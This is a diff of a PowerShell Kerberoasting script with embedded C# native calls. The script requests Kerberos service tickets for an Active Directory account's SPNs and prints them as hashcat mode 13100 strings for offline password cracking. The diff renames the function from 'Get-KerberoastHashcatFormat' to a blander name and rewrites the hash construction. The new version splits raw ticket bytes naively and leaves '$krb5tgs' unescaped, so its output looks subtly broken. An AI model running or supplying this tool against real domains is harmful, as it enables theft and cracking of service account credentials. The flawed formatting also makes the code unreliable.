@@ -1,3 +1,4 @@
+# Load required native methods for Kerberos ticket request
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -57,45 +58,24 @@ public class K {
         IntPtr expiry2 = IntPtr.Zero;
         uint attr = 0;
 
+        SecBuffer secBuf = new SecBuffer();
+        secBuf.BufferType = 2; // SECBUFFER_TOKEN
+        secBuf.cbBuffer = 12288;
+        secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
+
+        IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
+        Marshal.StructureToPtr(secBuf, pSecBuf, false);
+
+        SecBufferDesc desc = new SecBufferDesc();
+        desc.ulVersion = 0;
+        desc.cBuffers = 1;
+        desc.pBuffers = pSecBuf;
+
         try {
-            SecBuffer secBuf = new SecBuffer();
-            secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288; // 12KB buffer
-            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
-
-            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
-            Marshal.StructureToPtr(secBuf, pSecBuf, false);
-
-            SecBufferDesc desc = new SecBufferDesc();
-            desc.ulVersion = 0;
-            desc.cBuffers = 1;
-            desc.pBuffers = pSecBuf;
-
-            if (AcquireCredentialsHandle(
-                    null,
-                    "Kerberos",
-                    0x00000002,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    IntPtr.Zero,
-                    out cred,
-                    out expiry1) != 0)
+            if (AcquireCredentialsHandle(null, "Kerberos", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, out expiry1) != 0)
                 return null;
 
-            if (InitializeSecurityContext(
-                    ref cred,
-                    IntPtr.Zero,
-                    spn,
-                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
-                    0,
-                    16,
-                    IntPtr.Zero,
-                    0,
-                    out ctx,
-                    ref desc,
-                    out attr,
-                    out expiry2) != 0)
+            if (InitializeSecurityContext(ref cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, ref desc, out attr, out expiry2) != 0)
                 return null;
 
             SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
@@ -112,8 +92,7 @@ public class K {
 }
 "@
 
-function Get-KerberoastHashcatFormat {
-    [CmdletBinding()]
+function Get-KerberosTicketHashcatFormat {
     param(
         [Parameter(Mandatory)]
         [string]$SamAccountName
@@ -122,43 +101,40 @@ function Get-KerberoastHashcatFormat {
     try {
         $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
         if (-not $user) {
-            Write-Error "User '$SamAccountName' not found in Active Directory."
+            Write-Error "User '$SamAccountName' not found."
             return
         }
 
         if (-not $user.servicePrincipalName) {
-            Write-Warning "No SPNs found for '$SamAccountName'."
+            Write-Warning "No SPNs found for user '$SamAccountName'."
             return
         }
 
         foreach ($spn in $user.servicePrincipalName) {
-            try {
-                Write-Host "Requesting ticket for SPN: ${spn}"
-
-                $ticketBytes = [K]::GetRawTicket($spn)
-                if (-not $ticketBytes) {
-                    Write-Warning "Failed to retrieve ticket for ${spn}."
-                    continue
-                }
-
-                $hex = [BitConverter]::ToString($ticketBytes).Replace("-", "")
-                
-                if ($hex -match '^(?<checksum>.{32})(?<encdata>.+)$') {
-                    $checksum = $matches['checksum']
-                    $encdata = $matches['encdata']
-                    $domain = $env:USERDNSDOMAIN
-                    $cleanSpn = $spn -replace ":", "~"
-                    $hashcat = "\$krb5tgs\$23\$*${SamAccountName}`$${domain}`$${cleanSpn}*$checksum`$$encdata"
-                    Write-Output "`n[+] Hashcat Format for ${spn}:`n$hashcat`n"
-                } else {
-                    Write-Warning "Unable to parse ticket for ${spn}."
-                }
-
-            } catch {
-                Write-Warning "Error while processing SPN ${spn}: $_"
+            Write-Host "[*] Requesting TGS for SPN: $spn"
+            $ticketBytes = [K]::GetRawTicket($spn)
+            if (-not $ticketBytes) {
+                Write-Warning "[!] Failed to retrieve ticket for $spn"
+                continue
             }
+
+            # Split checksum and encrypted data
+            $checksum = $ticketBytes[0..15]
+            $ciphertext = $ticketBytes[16..($ticketBytes.Length - 1)]
+
+            $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ""
+            $ciphertextHex = ($ciphertext | ForEach-Object { $_.ToString("x2") }) -join ""
+
+            # Construct domain/SPN part
+            $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
+            $sanitizedSpn = $spn.Replace("/", "-")
+
+            # Hashcat format (mode 13100)
+            $hashcatFormat = "$krb5tgs\$23\$*$SamAccountName\$$domain\$$spn\$$checksumHex\$$ciphertextHex"
+
+            Write-Host "[+] Hashcat Format:`n$hashcatFormat"
         }
     } catch {
-        Write-Error "General error: $_"
+        Write-Error "Error: $_"
     }
 }
